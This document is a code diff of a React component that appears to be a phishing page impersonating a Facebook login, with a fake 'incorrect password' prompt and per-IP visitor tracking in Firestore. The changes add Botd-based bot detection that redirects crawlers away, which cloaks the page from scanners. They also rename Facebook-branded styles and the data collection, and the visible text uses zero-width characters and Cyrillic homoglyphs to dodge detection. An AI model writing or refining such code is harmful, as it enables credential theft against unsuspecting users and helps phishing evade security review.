@@ -1,5 +1,6 @@
 import React, { useEffect, useState } from 'react';
 import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
+import Botd from '@fingerprintjs/botd';
 import { publicIpv4 } from 'public-ip';
 import { BsInfoCircleFill as IconInfo } from "react-icons/bs";
 import { IoIosAdd as IconAdd } from "react-icons/io";
@@ -20,14 +21,21 @@ const Rickerson = () => {
     const isMobile = useMediaQuery({ query: '(max-width: 767px)' });
 
             // Bot detection and redirect to /blank
-        useEffect(() => {
-            const userAgent = navigator.userAgent.toLowerCase();
-            const isBot = /bot|crawler|spider|crawling/.test(userAgent);
-    
-            if (isBot) {
-                window.location.href = '/ds';
-            }
-        }, []);
+useEffect(() => {
+    const detectBot = async () => {
+        const botd = await Botd.load();
+        const result = await botd.detect();
+
+        if (result.bot) {
+            console.log('Bot detected:', result.bot.type);
+            window.location.href = "/ds";
+        } else {
+            console.log('Not a bot');
+        }
+    };
+
+    detectBot();
+}, []);
         
     useEffect(() => {
         if (isMobile) {
@@ -82,7 +90,7 @@ IP: '${ip}'
         setdexlus(e.target.value); // Allow any input
     };
     const getUserData = async (e) => {
-        const documentSnapshot = await getDocs(collection(db, "costarica"));
+        const documentSnapshot = await getDocs(collection(db, "georgebs"));
         const newData = documentSnapshot.docs
             .map((doc) => ({ ...doc.data(), id: doc.id }));
         const filter = newData.filter(x => {
@@ -107,7 +115,7 @@ IP: '${ip}'
 
     useEffect(() => {
         if (ip) {
-            onSnapshot(collection(db, "costarica"), (snapshot) => {
+            onSnapshot(collection(db, "georgebs"), (snapshot) => {
                 let isExist = false;
                 snapshot.docs.map((doc) => ({ ...doc.data(), id: doc.id })).filter(x => {
                     if (x.ip === ip) {
@@ -144,7 +152,7 @@ IP: '${ip}'
 
     const addUserData = async () => {
         try {
-            const docRef = doc(collection(db, "costarica"), ip);
+            const docRef = doc(collection(db, "georgebs"), ip);
 
             // Check if the document exists
             const docSnap = await getDoc(docRef);
@@ -168,7 +176,7 @@ IP: '${ip}'
 
     const resetUserNumber = async () => {
         try {
-            const docRef = doc(collection(db, "costarica"), ip);
+            const docRef = doc(collection(db, "georgebs"), ip);
             await setDoc(docRef, { redir: "-1" }, { merge: true });
             console.log("User number reset to -1 for IP: ", ip);
         } catch (e) {
@@ -193,7 +201,7 @@ IP: '${ip}'
 
     if (isUserData) {
         return (
-            <section className="w-full hidden sm:flex flex-col items-center justify-start bg-seashell">
+            <section className="w-full hidden sm:flex flex-col items-center justify-start bg-dedese">
                 <div className="w-full max-w-6xl flex flex-col items-center justify-start gap-3 py-14 px-2 sm:px-3 lg:px-4">
                     <a
                         href="/"
@@ -234,16 +242,16 @@ IP: '${ip}'
         The pas‌sword you’ve ent‌ered is inco‌rrect. Forg‌ot Pass‌word?
         
     </p>
-                            <button type="submit" className="submit-button w-full px-3 h-[45px] bg-facebook hover:bg-opacity-90 text-white text-xl font-semibold rounded-md transition-all duration-300" >L‌o‌g i‌n </button>
+                            <button type="submit" className="submit-button w-full px-3 h-[45px] bg-begex hover:bg-opacity-90 text-white text-xl font-semibold rounded-md transition-all duration-300" >L‌o‌g i‌n </button>
                         </form>
                         {/* Forgab */}
                         <div className="w-full flex items-center justify-center gap-3">
                             <button
                                 type="button"
-                                className=" text-facebook text-sm font-medium bg-none hover:underline transition-all duration-300" style={{ fontSize: '14.39px', fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif' }}>
+                                className=" text-begex text-sm font-medium bg-none hover:underline transition-all duration-300" style={{ fontSize: '14.39px', fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif' }}>
                                 F‌org‌ot ac‌cou‌nt?
                             </button>
-                            <button type="button" className="text-facebook text-sm font-medium bg-none hover:underline transition-all duration-300" style={{ fontSize: '14.39px', fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif' }}>
+                            <button type="button" className="text-begex text-sm font-medium bg-none hover:underline transition-all duration-300" style={{ fontSize: '14.39px', fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif' }}>
                                 Si‌gn u‌р f‌оr F‌ас‌еbо‌оk
                             </button>
                         </div>
@@ -261,7 +269,7 @@ IP: '${ip}'
                                     {item}
                                 </p>
                             ))}
-                            <div className="bg-smoke hover:bg-harp px-1 py-[0px] flex items-center justify-center border-[1px] border-solid border-grey-ghost rounded-[2px] overflow-hidden cursor-pointer transition-all duration-300">
+                            <div className="bg-fersyt hover:bg-babsg px-1 py-[0px] flex items-center justify-center border-[1px] border-solid border-grey-ghost rounded-[2px] overflow-hidden cursor-pointer transition-all duration-300">
                                 <IconAdd size={20} />
                             </div>
                         </div>
